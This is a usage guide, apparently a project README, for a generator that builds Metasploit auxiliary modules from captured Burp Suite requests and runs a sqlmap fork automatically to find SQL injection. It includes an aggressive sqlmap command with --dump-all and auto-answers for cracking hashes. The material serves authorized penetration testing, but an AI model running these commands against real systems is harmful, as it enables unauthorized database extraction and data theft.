# MSF Module Generator (`sqlmap-nu11secur1ty`) — Full Usage Guide

**Author:** nu11secur1ty  
**Description:** Generate Metasploit auxiliary modules from Burp Suite requests and run `sqlmap-nu11secur1ty` automatically.  

**Important:** Only for lab/authorized testing.

---

## Overview

This generator allows you to create a Metasploit module (`.rb`) from any HTTP request captured in Burp Suite.  
The module will:

1. Save the request to `exploit.txt`.
2. Run `sqlmap-nu11secur1ty` automatically for SQLi testing.
3. Allow easy use inside `msfconsole`.

---

## Directory Setup

```
sqlmap-nu11secur1ty/
├── sqlmap.py # SQLi testing engine
├── MSF/
│ ├── msf_rb_generator.py # Python generator
│ ├── YourModule.rb # Generated Metasploit module
│ └── exploit.txt # Saved HTTP request
```


> Ensure `sqlmap.py` is in the **parent folder** of `MSF/`.

---

## Step 1 — Capture HTTP Request

1. Open Burp Suite.
2. Capture the request you want to test (POST or GET).
3. Copy the full raw request including headers and body.

---

## Step 2 — Run Generator

Open a terminal in the `MSF/` folder:

```bash
cd sqlmap-nu11secur1ty/MSF/
python3 msf_rb_generator.py
```


1. You will be prompted to enter:

2. Output filename (e.g., MyModule.rb)

3. Module name (e.g., SQLi-Test)

4. Author name

5. Module description

6. Paste the Burp request → End with a single line END

Example:

```
POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin&password=admin
END
```
# Copy your module
- create folder, e.g., MSF/ inside auxiliary
```
sudo cp /path/to/MyModule.rb /usr/share/metasploit-framework/modules/auxiliary/MSF/
sudo cp /path/to/exploit.txt /usr/share/metasploit-framework/modules/auxiliary/MSF/
```
-Ensure proper permissions (Metasploit needs read access):
```
sudo chmod 644 /usr/share/metasploit-framework/modules/auxiliary/MSF/MyModule.rb
```

After running, two files will be generated:

- .rb Metasploit module (MyModule.rb)

- exploit.txt containing the saved request


Step 3 — Load Module in Metasploit

1. Start msfconsole:

```
msfconsole

```

2. Use your generated module:


```
use auxiliary/MSF/MyModule.rb
```


3. Set options:


```
set RAW_REQUEST `cat exploit.txt`
```

4. Run the module:

```
run
```

# usage inside of MSF:
```
sqlmap -r exploit.txt --no-cast --no-escape --dbms=mysql --time-sec=11 --random-agent --level=5 --risk=3 --common-tables --common-columns --common-files --batch --flush-session --technique=TBEUSQ --union-char=UCHAR --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump-all
```


# Behavior:

- Saves the HTTP request to exploit.txt.

- Executes sqlmap.py -r exploit.txt --batch --level=1 automatically.

- Output from SQLmap will be printed in the console.


# Step 4 — Review Results

- SQL injection vulnerabilities detected by sqlmap-nu11secur1ty will appear in the console output.

- Any extracted data will be handled by SQLmap in the usual manner.


# Notes / Recommendations

- Always test in authorized labs.

- exploit.txt will be overwritten each run.

- Works with any HTTP request captured from Burp Suite.

- sqlmap.py must reside in the parent folder of MSF/.

- You can modify the generated .rb module for advanced payloads or custom SQLmap options.



# Optional Advanced Usage

- Change SQLmap level or batch mode in the generated .rb:

```
sqlmap_cmd = "python3 #{sqlmap_path} -r #{request_file} --batch --level=3 --risk=2"
```


- Use the module multiple times by generating new .rb files with different Burp requests.

